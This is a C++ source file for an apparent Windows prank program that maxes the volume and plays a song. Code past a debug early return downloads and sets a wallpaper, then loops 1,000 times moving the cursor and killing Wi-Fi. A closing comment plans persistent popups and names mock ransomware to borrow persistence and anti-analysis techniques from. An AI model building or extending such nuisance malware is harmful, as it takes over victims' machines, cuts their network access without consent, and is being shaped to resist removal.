#include "pch.h"
#include "definitions.h"
#include "cursor.h"
#include "audio.h"
#include "wallpaper.h"
#include "network.h"
#include "structures.h"

// Global variables
std::string wallpaper_urls[] = { "", };

//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
int main()
{
	MaxVol();
	
	//HANDLE mouseThread = CreateThread(0, 0, troll_the_mouse, NULL, 0, 0);

	bool done = false;
	HANDLE audioThread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
	while (!done) {
		Sleep(1000);
	}
	CloseHandle(audioThread);
	//CloseHandle(mouseThread);
	return 0; // debug out


	int count = 0;
	std::string url = "https://i.ytimg.com/vi/ibr6egCSqiE/maxresdefault.jpg";

	char cCurrentPath[FILENAME_MAX];

	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
	{
		return 1;
	}

	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */

	char outfilename[FILENAME_MAX] = "file.jpg";
	char file[FILENAME_MAX] = "\\file.jpg";

	errno_t succ = strcat_s(cCurrentPath, MAX_PATH, file);
	DownloadFile(url, outfilename);
	//LPCWSTR fin = cC;
	SetWallpaper((LPCWSTR) cCurrentPath);

	
	while (count < 1000) { // # of reps
		int v1 = 1;
		if (v1) {
			MoveCursor();
		}
		KillWifi();
		count++;
		Sleep(2000); // Wait time
	}
	
	//CloseHandle(threadHandler);

	return 0;
}

/*
	Ideas to add:
		1. Add continually popping up Soviet Popup (https://stackoverflow.com/questions/1186017/how-do-i-build-a-graphical-user-interface-in-c)
			(http://www.cplusplus.com/forum/beginner/137030/)
			(https://stackoverflow.com/questions/2886609/how-to-make-multiple-windows-using-win32-api)
			(http://www.winprog.org/tutorial/start.html)

		2. Project type change note
		https://stackoverflow.com/questions/6626397/error-lnk2019-unresolved-external-symbol-winmain16-referenced-in-function#8532797

		3. Check out persistence and defensive methods from this mock ransomware and this mock malware
			https://github.com/ryancor/mock-ransomware/blob/master/ransomware/ransomware/anti_checks.cpp
			http://www.rohitab.com/discuss/topic/25977-malware-c/

*/